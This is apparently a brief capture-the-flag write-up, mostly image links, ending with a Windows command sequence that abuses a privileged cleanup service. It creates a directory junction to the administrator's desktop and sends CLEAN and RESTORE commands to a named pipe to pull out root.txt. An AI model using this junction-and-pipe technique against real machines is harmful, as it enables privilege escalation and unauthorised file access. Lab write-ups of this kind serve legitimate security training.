# Cleanup

![[Pasted image 20210716094326.png]]


# Reverse Eng

![[Pasted image 20210716103013.png]]


# Flag 


```bash
mlink /j \users\web\downloads\gotroot \users\administrator\desktop
echo CLEAN C:\users\web\Downloads\gotroot\root.txt1 > \\.\pipe\cleanupPipe
rmdir \users\web\downloads\gotroot
mkdir \users\web\downloads\gotroot
echo RESTORE C:\users\web\Downloads\gotroot\root.txt1 > \\.\pipe\cleanupPipe
```

